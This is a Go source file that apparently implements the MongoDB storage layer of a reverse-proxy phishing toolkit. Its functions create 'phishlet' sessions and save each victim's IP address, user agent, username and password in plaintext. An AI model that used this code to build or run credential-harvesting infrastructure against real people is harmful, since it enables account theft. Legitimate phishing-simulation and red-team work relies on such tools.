package database

import (
	"context"
	"log"
	"time"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

type Database struct {
	client  *mongo.Client
	db      *mongo.Database
	context context.Context
}

// NewDatabase initializes a connection to MongoDB
func NewDatabase(uri string, dbName string) (*Database, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	client, err := mongo.Connect(ctx, options.Client().ApplyURI(uri))
	if err != nil {
		return nil, err
	}

	// Ping the MongoDB server to verify connection
	if err := client.Ping(ctx, nil); err != nil {
		return nil, err
	}

	log.Printf("Connected to MongoDB at %s", uri)

	return &Database{
		client:  client,
		db:      client.Database(dbName),
		context: context.Background(),
	}, nil
}

// CreateSession adds a new session document to the sessions collection
func (d *Database) CreateSession(sid string, phishlet string, landingURL string, userAgent string, remoteAddr string) error {
	session := bson.M{
		"sid":         sid,
		"phishlet":    phishlet,
		"landing_url": landingURL,
		"useragent":   userAgent,
		"remote_addr": remoteAddr,
		"created_at":  time.Now().Unix(),
	}
	_, err := d.db.Collection("sessions").InsertOne(d.context, session)
	return err
}

// ListSessions retrieves all sessions from the database
func (d *Database) ListSessions() ([]bson.M, error) {
	var sessions []bson.M
	cursor, err := d.db.Collection("sessions").Find(d.context, bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(d.context)

	for cursor.Next(d.context) {
		var session bson.M
		if err := cursor.Decode(&session); err != nil {
			return nil, err
		}
		sessions = append(sessions, session)
	}
	return sessions, nil
}

// SetSessionUsername updates the username of a session
func (d *Database) SetSessionUsername(sid string, username string) error {
	filter := bson.M{"sid": sid}
	update := bson.M{"$set": bson.M{"username": username}}
	_, err := d.db.Collection("sessions").UpdateOne(d.context, filter, update)
	return err
}

// SetSessionPassword updates the password of a session
func (d *Database) SetSessionPassword(sid string, password string) error {
	filter := bson.M{"sid": sid}
	update := bson.M{"$set": bson.M{"password": password}}
	_, err := d.db.Collection("sessions").UpdateOne(d.context, filter, update)
	return err
}

// DeleteSession deletes a session by its sid
func (d *Database) DeleteSession(sid string) error {
	filter := bson.M{"sid": sid}
	_, err := d.db.Collection("sessions").DeleteOne(d.context, filter)
	return err
}

// Close disconnects the MongoDB client
func (d *Database) Close() error {
	return d.client.Disconnect(d.context)
}
